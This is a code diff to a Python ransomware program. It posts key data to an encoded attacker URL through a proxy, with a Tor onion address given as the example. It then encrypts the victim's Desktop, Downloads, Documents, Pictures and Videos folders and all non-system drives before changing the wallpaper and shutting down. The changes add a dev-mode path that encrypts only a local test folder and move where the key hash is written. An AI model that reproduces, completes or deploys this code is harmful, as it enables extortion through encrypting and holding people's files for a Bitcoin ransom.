@@ -37,7 +37,7 @@ from Crypto.Cipher import PKCS1_OAEP
 # Decode the encoded URL using the dx42 function.
 YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode()  # Replace with your encoded URL
 # Encode a URL using the ex42 function from the edx42 module
-# Example: encoded_url = ex42(b"https://example.com".encode())
+# Example: encoded_url = ex42(b"https://your-tor-server.onion".encode())
 YOUR_PROXY = dx42(b"YOUR_ENCODED_PROXY").decode() # Replace with your encoded proxy
 YOUR_BITCOIN_ADDRESS = "YOUR_BITCOIN_ADDRESS"
 YOUR_EMAIL_ADDRESS = dx42(b"YOUR_ENCODED_EMAIL_ADDRESS").decode()
@@ -377,38 +377,41 @@ def start_encryption():
             requests.post(YOUR_URL, data=data, proxies=proxies, timeout=30)
         except requests.exceptions.RequestException as e:
             print(f"Error sending data: {e}")
+            with open(
+                os.path.join(f"C:\\Users\\{getpass.getuser()}", "key.sha256"), "wb"
+            ) as f:
+                f.write(hashlib.sha256(bytes(key)).hexdigest().encode())
+        if not dev_mode:
+            encrypt_directory(
+                os.path.join(f"C:\\Users\\{getpass.getuser()}", "Desktop"), bytes(key)
+            )
+            encrypt_directory(
+                os.path.join(f"C:\\Users\\{getpass.getuser()}", "Downloads"), bytes(key)
+            )
+            encrypt_directory(
+                os.path.join(f"C:\\Users\\{getpass.getuser()}", "Documents"), bytes(key)
+            )
+            encrypt_directory(
+                os.path.join(f"C:\\Users\\{getpass.getuser()}", "Pictures"), bytes(key)
+            )
+            encrypt_directory(
+                os.path.join(f"C:\\Users\\{getpass.getuser()}", "Videos"), bytes(key)
+            )
 
-        with open(
-            os.path.join(f"C:\\Users\\{getpass.getuser()}", "key.sha256"), "wb"
-        ) as f:
-            f.write(hashlib.sha256(bytes(key)).hexdigest().encode())
-
-        encrypt_directory(
-            os.path.join(f"C:\\Users\\{getpass.getuser()}", "Desktop"), bytes(key)
-        )
-        encrypt_directory(
-            os.path.join(f"C:\\Users\\{getpass.getuser()}", "Downloads"), bytes(key)
-        )
-        encrypt_directory(
-            os.path.join(f"C:\\Users\\{getpass.getuser()}", "Documents"), bytes(key)
-        )
-        encrypt_directory(
-            os.path.join(f"C:\\Users\\{getpass.getuser()}", "Pictures"), bytes(key)
-        )
-        encrypt_directory(
-            os.path.join(f"C:\\Users\\{getpass.getuser()}", "Videos"), bytes(key)
-        )
-
-        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
-        for disk in [
-            f"{letter}:/"
-            for i, letter in enumerate(string.ascii_uppercase)
-            if bitmask & (1 << i)
-        ]:
-            if disk[:2] != os.getenv("SystemDrive") and disk[:2] != os.getenv(
-                "HOMEDRIVE"
-            ):
-                encrypt_directory(disk, bytes(key))
+            bitmask = ctypes.windll.kernel32.GetLogicalDrives()
+            for disk in [
+                f"{letter}:/"
+                for i, letter in enumerate(string.ascii_uppercase)
+                if bitmask & (1 << i)
+            ]:
+                if disk[:2] != os.getenv("SystemDrive") and disk[:2] != os.getenv(
+                    "HOMEDRIVE"
+                ):
+                    encrypt_directory(disk, bytes(key))
+        else:
+            encrypt_directory(
+                ".\\test", bytes(key)
+            )
 
     finally:
         zeroize1(key)
@@ -574,3 +577,5 @@ if __name__ == "__main__":
         start_encryption()
         change_wallpaper()
         shutdown()
+    else:
+        start_encryption()
